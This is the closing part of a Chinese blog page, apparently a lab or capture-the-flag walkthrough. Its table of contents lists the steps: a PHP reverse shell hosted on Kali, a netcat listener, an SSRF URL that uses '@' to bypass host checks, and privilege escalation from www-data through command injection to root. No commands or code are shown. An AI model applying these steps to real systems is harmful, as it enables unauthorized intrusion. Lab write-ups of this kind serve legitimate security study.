href="#2-%E5%9C%A8%E6%94%BB%E5%87%BB%E6%9C%BA-Kali-%E4%B8%8A%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%8F%8D%E5%BC%B9-shell-%E7%9A%84-txt-%E6%96%87%E4%BB%B6-reverse-txt-%E9%87%8C%E9%9D%A2%E5%86%99%E7%9A%84%E6%98%AFphp%E4%BB%A3%E7%A0%81%EF%BC%8C%E8%A6%81%E5%AD%98%E6%94%BE%E5%9C%A8-var-www-html-%E7%9B%AE%E5%BD%95%E4%B8%8B%E3%80%82%E5%8F%AF%E4%BB%A5%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%8A%E9%9D%A2%E8%AE%BF%E9%97%AE%E8%AF%B4%E6%98%8E%E8%BF%99%E4%B8%AA%E6%96%87%E4%BB%B6%E5%AD%98%E6%94%BE%E4%BD%8D%E7%BD%AE%E4%B8%94%E9%85%8D%E7%BD%AE%E6%88%90%E5%8A%9F-kali%E6%9C%89%E8%87%AA%E5%B8%A6%E7%9A%84%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E6%96%87%E4%BB%B6"><span class="toc-number">2.3.</span> <span class="toc-text">2.在攻击机 (Kali) 上创建一个反弹 shell 的 txt 文件 ( reverse.txt )里面写的是php代码，要存放在&#x2F;var&#x2F;www&#x2F;html&#x2F;目录下。可以在浏览器上面访问说明这个文件存放位置且配置成功(kali有自带的反弹shell的文件)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E5%9C%A8-Kali-%E4%B8%8A%E5%BC%80%E5%90%AF-netcat-%E7%9B%91%E5%90%AC"><span class="toc-number">2.4.</span> <span class="toc-text">3.在 Kali 上开启 netcat 监听</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E5%9C%A8%E9%9D%B6%E6%9C%BA%E4%B8%8A%E6%9E%84%E9%80%A0%E6%81%B6%E6%84%8F%E7%9A%84-URL%EF%BC%8C%E5%88%A9%E7%94%A8-%E7%AC%A6%E5%8F%B7%E7%BB%95%E8%BF%87%E4%B8%BB%E6%9C%BA%E9%AA%8C%E8%AF%81%EF%BC%8C%E5%B9%B6%E6%8C%87%E5%90%91%E6%94%BB%E5%87%BB%E6%9C%BA-kali-%E4%B8%8A%E7%9A%84%E5%8F%8D%E5%BC%B9-shell-%E6%96%87%E4%BB%B6%E3%80%82"><span class="toc-number">2.5.</span> <span class="toc-text">4.在靶机上构造恶意的 URL，利用 @ 符号绕过主机验证，并指向攻击机(kali)上的反弹 shell 文件。</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E6%9C%80%E5%90%8E%E5%9C%A8%E6%94%BB%E5%87%BB%E6%9C%BA%EF%BC%88kali%EF%BC%89%E4%B8%8A%E9%9D%A2%E5%BC%80%E5%90%AF%E7%9A%84%E7%9B%91%E5%90%AC%E5%B0%B1%E4%BC%9A%E6%88%90%E5%8A%9F%E5%8F%8D%E5%BC%B9shell%E5%9B%9E%E6%98%BE%E3%80%82"><span class="toc-number">2.6.</span> <span class="toc-text">5.最后在攻击机（kali）上面开启的监听就会成功反弹shell回显。</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-%E4%B8%8A%E9%9D%A2%E7%9A%84%E5%8F%8D%E5%BC%B9shell%E4%BC%9A%E8%AF%9D%E6%98%BE%E7%A4%BA%E4%B8%8D%E5%A4%AA%E4%B9%A0%E6%83%AF%EF%BC%8C%E6%89%80%E4%BB%A5%E6%88%91%E5%B0%B1%E7%94%A8%E6%8C%87%E4%BB%A4%E5%8F%98%E6%88%90%E4%BA%A4%E4%BA%92%E5%BC%8F%E7%9A%84"><span class="toc-number">2.7.</span> <span class="toc-text">6.上面的反弹shell会话显示不太习惯，所以我就用指令变成交互式的</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">3.</span> <span class="toc-text">三、权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E4%BB%8E-www-data-%E5%88%B0-miao"><span class="toc-number">3.1.</span> <span class="toc-text">1. 从 www**-**data 到 miao</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.2.</span> <span class="toc-text">命令注入漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E4%BB%8E-miao-%E5%88%B0-root"><span class="toc-number">3.3.</span> <span class="toc-text">2. 从 miao 到 root</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8B%93%E5%B1%95%E7%9F%A5%E8%AF%86%EF%BC%9A%E6%81%A2%E5%A4%8D%E7%BB%88%E7%AB%AF"><span class="toc-number">3.4.</span> <span class="toc-text">拓展知识：恢复终端</span></a></li></ol></li></ol>
+                </div>
+            </button>
+            
+
+            
+
+            <a href="#nexmoe-content" class="backtop toc-link" aria-label="Back To Top" title="top"><button class="mdui-fab mdui-ripple"><i class="nexmoefont icon-caret-top"></i></button></a>
+        </div>
+    </div>
+</div></div><div id="nexmoe-footer"><!--!--></div><div id="nexmoe-search-space"><div class="search-container"><div class="search-header"><div class="search-input-container"><input class="search-input" type="text" placeholder="搜索" onInput="sinput();"></div><a class="search-close" onclick="sclose();">×</a></div><div class="search-body"></div></div></div><div><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2058306854838448" crossorigin="anonymous"></script>
+</div></body></html>
